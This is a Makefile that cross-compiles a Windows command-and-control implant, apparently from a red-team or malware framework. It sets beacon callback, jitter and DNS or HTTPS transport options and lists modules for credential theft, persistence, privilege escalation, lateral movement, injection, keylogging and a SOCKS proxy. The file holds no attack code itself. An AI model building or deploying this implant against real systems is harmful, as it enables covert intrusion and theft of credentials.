# Always cross-compile; host cc cannot build Windows targets.
CC       = x86_64-w64-mingw32-gcc
BUILD_DIR = ../build
OUT       = $(BUILD_DIR)/implant_c.exe

IMPLANT_ID     ?=
IMPLANT_SECRET ?=
CALLBACK_URL   ?= https://127.0.0.1:443
SLEEP_MS       ?= 5000
JITTER_PCT     ?= 20
CA_CERT_PEM    ?=
TRANSPORT_TYPE ?= https
DNS_DOMAIN     ?=
DNS_SERVER     ?=
CDN_DOMAIN     ?=

CFLAGS  = -Wall -Wextra -O2 -std=c11 -Iinclude -D_WIN32_WINNT=0x0601
LDFLAGS = -lwinhttp -lbcrypt -lws2_32 -lgdi32 -liphlpapi -lwldap32 -lshell32 -ladvapi32 -static

SRCS = \
	src/syscall/indirect.c \
	src/core/buffer.c \
	src/core/beacon.c \
	src/crypto/crypto.c \
	src/pb/wire.c \
	src/pb/c2.c \
	src/pb/c2_tasks.c \
	src/pb/c2_modules.c \
	src/modules/mod_util.c \
	src/modules/registry.c \
	src/modules/mod_shell.c \
	src/modules/mod_creds.c \
	src/modules/mod_cloud.c \
	src/modules/mod_persist.c \
	src/modules/mod_privesc.c \
	src/modules/mod_lateral.c \
	src/modules/mod_ldap.c \
	src/modules/mod_kerberos.c \
	src/transport/transport.c \
	src/transport/https.c \
	src/transport/dns.c \
	src/transport/dns_chunk.c \
	src/tasks/shell.c \
	src/tasks/file.c \
	src/tasks/process.c \
	src/tasks/network.c \
	src/tasks/inject.c \
	src/tasks/screenshot.c \
	src/tasks/keylog.c \
	src/tasks/socks.c \
	src/tasks/peload.c \
	src/tasks/stubs.c \
	src/tasks/executor.c \
	windows/main.c

.PHONY: all config clean

all: config $(OUT)

config:
	@chmod +x scripts/gen_config.sh
	IMPLANT_ID="$(IMPLANT_ID)" \
	IMPLANT_SECRET="$(IMPLANT_SECRET)" \
	CALLBACK_URL="$(CALLBACK_URL)" \
	SLEEP_MS="$(SLEEP_MS)" \
	JITTER_PCT="$(JITTER_PCT)" \
	CA_CERT_PEM="$(CA_CERT_PEM)" \
	TRANSPORT_TYPE="$(TRANSPORT_TYPE)" \
	DNS_DOMAIN="$(DNS_DOMAIN)" \
	DNS_SERVER="$(DNS_SERVER)" \
	CDN_DOMAIN="$(CDN_DOMAIN)" \
	./scripts/gen_config.sh include/erebus/config.h

$(OUT): config $(SRCS)
	@mkdir -p $(BUILD_DIR)
	$(CC) $(CFLAGS) $(SRCS) -o $(OUT) $(LDFLAGS)

clean:
	rm -f include/erebus/config.h $(OUT)